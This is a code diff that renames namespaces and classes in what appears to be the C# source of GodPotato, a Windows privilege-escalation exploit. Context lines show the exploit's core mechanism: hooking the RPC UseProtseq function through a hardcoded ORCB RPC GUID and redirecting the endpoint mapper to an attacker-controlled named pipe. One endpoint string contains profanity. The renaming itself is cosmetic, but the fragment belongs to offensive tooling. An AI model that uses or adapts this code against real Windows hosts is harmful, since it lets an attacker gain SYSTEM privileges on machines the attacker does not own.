@@ -5,11 +5,11 @@ using System.IO;
 using System.Runtime.InteropServices;
 using System.Security.Principal;
 using System.Threading;
-using static GodPotato.NativeAPI.NativeMethods;
+using static GodPotatoNet.NativeAPI.NativeMethods;
 
-namespace GodPotato.NativeAPI
+namespace GodPotatoNet.NativeAPI
 {
-    public class GodPotatoContext
+    public class GodPotatoNetContext
     {
         private static readonly Guid orcbRPCGuid = new Guid("18f70770-8e64-11cf-9af1-0020af6e72f4");
         public IntPtr CombaseModule { get; private set; }
@@ -29,7 +29,7 @@ namespace GodPotato.NativeAPI
         public bool IsStart { get; private set; }
         public bool IsHook { get; private set; }
 
-        public GodPotatoContext(TextWriter consoleWriter, string pipeName)
+        public GodPotatoNetContext(TextWriter consoleWriter, string pipeName)
         {
             this.PipeName = pipeName;
             this.newOrcbRPC = new NewOrcbRPC(this);
@@ -45,7 +45,6 @@ namespace GodPotato.NativeAPI
             {
                 throw new Exception("Cannot find IDL structure");
             }
-
 
             string delegateFunName = "delegateFun" + UseProtseqFunctionParamCount;
             string funName = "fun" + UseProtseqFunctionParamCount;
@@ -251,14 +250,14 @@ namespace GodPotato.NativeAPI
 
     class NewOrcbRPC
     {
-        private GodPotatoContext godPotatoContext;
-        public NewOrcbRPC(GodPotatoContext godPotatoContext)
+        private GodPotatoNetContext GodPotatoNetContext;
+        public NewOrcbRPC(GodPotatoNetContext GodPotatoNetContext)
         {
-            this.godPotatoContext = godPotatoContext;
+            this.GodPotatoNetContext = GodPotatoNetContext;
         }
         public int fun(IntPtr ppdsaNewBindings, IntPtr ppdsaNewSecurity)
         {
-            string[] endpoints = { $"ncacn_np:localhost/pipe/{godPotatoContext.PipeName}[\\pipe\\epmapper]", "ncacn_ip_tcp:fuck you !" };
+            string[] endpoints = { $"ncacn_np:localhost/pipe/{GodPotatoNetContext.PipeName}[\\pipe\\epmapper]", "ncacn_ip_tcp:fuck you !" };
 
             int entrieSize = 3;
             for (int i = 0; i < endpoints.Length; i++)
